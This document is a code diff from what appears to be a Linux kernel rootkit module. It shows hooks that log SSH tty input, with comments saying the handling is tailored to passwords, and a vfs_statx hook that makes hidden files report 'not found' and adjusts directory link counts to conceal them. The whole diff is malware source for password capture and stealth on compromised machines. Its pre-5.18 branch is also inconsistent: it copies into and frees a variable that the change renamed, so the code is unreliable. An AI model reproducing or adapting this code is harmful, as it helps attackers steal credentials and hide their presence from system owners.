@@ -994,12 +994,10 @@ static ssize_t m_tty_read(struct kiocb *iocb, struct iov_iter *to)
 		flags |= (byte == '\n') ? R_NEWLINE : flags;
 
 		/**
-         * This implementation might appear a bit unconventional, but
-         * it's designed to handle SSH session data. The data typically
-         * arrives byte by byte, but there are instances when it comes
-         * as a multi-byte stream, for example, during password input.
-         * It's particularly tailored for handling passwords.
-         */
+		 * Handles SSH session data, which usually arrives one byte at a time.
+		 * However, in certain cases, such as during password input, the data may 
+		 * arrive as a multi-byte stream.
+		 */
 		if ((app_flag & APP_FTP) && rv > 1) {
 			ttybuf[strcspn(ttybuf, "\r")] = '\0';
 			_tty_write_log(uid, 0, ttybuf, sizeof(ttybuf));
@@ -1067,43 +1065,48 @@ static long m_vfs_statx(int dfd, struct filename *filename, int flags,
 			struct kstat *stat, u32 request_mask)
 {
 #endif
-#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 18, 0)
-	char *name = kzalloc(PROCNAME_MAXLEN, GFP_KERNEL);
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,18,0)
+	char *target = kzalloc(PROCNAME_MAXLEN, GFP_KERNEL);
 #else
-	char *name = filename ? filename->name : "";
+    char *target = filename ? filename->name : NULL;
 #endif
 
-	/* call original first, I want stat */
-	long rv = real_vfs_statx(dfd, filename, flags, stat, request_mask);
+    /* call original first, I need stat */
+    long rv = real_vfs_statx(dfd, filename, flags, stat, request_mask);
 
-	/** handle two distinct operations
-     *  1   If is directory, look for hidden file names
-     *      and update hard-links counter accordingly.
-     *  2   make stat fail for /proc interface.
+    if (!target) goto leave;
+
+    /**
+     *  Return not found to userspace if target is present (file,dir),
+     *  otherwise count the number of hidden hard-links
+     *      and use it to decrement "Links:"
+     *  Check: if it can be optimized
      * */
-
-#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 18, 0)
-	if (name != NULL &&
-	    !copy_from_user((void *)name, filename, PROCNAME_MAXLEN - 1)) {
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,18,0)
+    if (name != NULL && !copy_from_user((void*)name, filename, PROCNAME_MAXLEN-1)) {
 #endif
-		if (strlen(name) > 0 && S_ISDIR(stat->mode)) {
-			int count = fs_is_dir_inode_hidden((const char *)name,
-							   stat->ino);
-			if (count > 0) {
-				prinfo("%s: file match ino=%llu nlink=%d count=%d\n",
-				       __func__, stat->ino, stat->nlink, count);
+        const char *name = fs_get_basename((const char*)target);
+        if (fs_search_name(name, stat->ino)) {
+            rv = -ENOENT;
+            goto leave;
+        }
 
-				/* Hit(s) -> decrement hard-link counts */
-				stat->nlink -= count;
-			}
-		} else if (strstr(name, PROCNAME)) {
-			rv = -ENOENT;
-		}
-#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 18, 0)
-		kfree(name);
-	}
+        /* nothing found for this entry.
+         * Tamper 'nlink', if needed.
+         */
+        if (S_ISDIR(stat->mode)) {
+            int count = fs_is_dir_inode_hidden(stat->ino);
+            if (count > 0) {
+                prinfo("%s: file match ino=%llu nlink=%d count=%d\n", __func__, stat->ino, stat->nlink, count);
+                stat->nlink -= count;
+            }
+        }
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,18,0)
+        kfree(name);
+    }
 #endif
-	return rv;
+leave:
+    return rv;
 }
 
 /**
